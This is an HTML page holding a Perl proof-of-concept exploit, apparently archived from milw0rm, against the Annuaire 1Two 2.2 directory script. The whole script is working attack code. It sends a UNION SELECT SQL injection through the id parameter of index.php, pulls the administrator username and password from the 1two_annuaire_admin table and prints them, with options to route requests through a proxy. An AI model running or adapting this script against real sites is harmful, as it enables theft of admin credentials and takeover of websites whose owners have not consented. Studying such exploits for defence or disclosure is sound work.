<html><head><title>Annuaire 1Two 2.2 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# Affected.scr..: Annuaire 1Two 2.2
# Poc.ID........: 09060902.txt
# Type..........: SQL Injection (without quote)
# Risk.level....: Medium
# Vendor.Status.: Unpatched
# Src.download..: http://www.1two.org/
# Poc.link......: acid-root.new.fr/poc/09060902.txt
# Credits.......: DarkFig
#
#
use LWP::UserAgent;
use HTTP::Request;
use Getopt::Long;
use strict;


print STDOUT &quot;\n+&quot;, '-' x 53, &quot;+\n&quot;;
print STDOUT &quot;|    Annuaire 1Two 2.2 Remote SQL Injection Exploit   |\n&quot;;
print STDOUT '+', '-' x 53, &quot;+\n&quot;;

my($host,$path,$proxh,$proxu,$proxp,);
my $opt = GetOptions(
   'host=s'   =&gt;  \$host,
   'path=s'   =&gt;  \$path,
   'proxh=s'  =&gt;  \$proxh,
   'proxu=s'  =&gt;  \$proxu,
   'proxp=s'  =&gt;  \$proxp);
   
if(!$host) {
    print STDOUT &quot;| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\n&quot;;
    print STDOUT &quot;| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\n&quot;;
    print STDOUT '+', '-' x 53, &quot;+\n&quot;;
    exit(0);
}

if(!$path) {$path  = '/';}
if($host  !~ /http/) {$host  = 'http://'.$host;}
if($proxh !~ /http/ &amp;&amp; $proxh != '') {$proxh = 'http://'.$proxh.'/';}

my @fi = ('username', 'password');
my $ur = $host.$path.'index.php?id=';
my $ua = LWP::UserAgent-&gt;new();
   $ua-&gt;agent('Mozilla XD');
   $ua-&gt;timeout(30);
   $ua-&gt;proxy(['http'] =&gt; $proxh) if $proxh;

foreach(@fi) {
my $xx = $_;
my $re = HTTP::Request-&gt;new(GET =&gt;  $ur.&quot;-1 UNION SELECT $xx FROM 1two_annuaire_admin&quot;);
   $re-&gt;proxy_authorization_basic($proxu, $proxp) if $proxp;
my $xd = $ua-&gt;request($re);
my $da = $xd-&gt;content;

if($da =~ /- (.*?)&lt;\/title&gt;/) {
      if($xx eq 'username') {
            print STDOUT &quot; [+]User:&quot;;}
      if($xx eq 'password') {
            print STDOUT &quot; [+]Passwd:&quot;;}
      print STDOUT &quot; $1\n&quot;;
} else {
  print STDOUT &quot;[!]Exploit failed\n&quot;;
}}
print STDOUT &quot;+&quot;, '-' x 53, &quot;+\n&quot;;
exit(0);

# milw0rm.com [2006-09-02]</pre></html>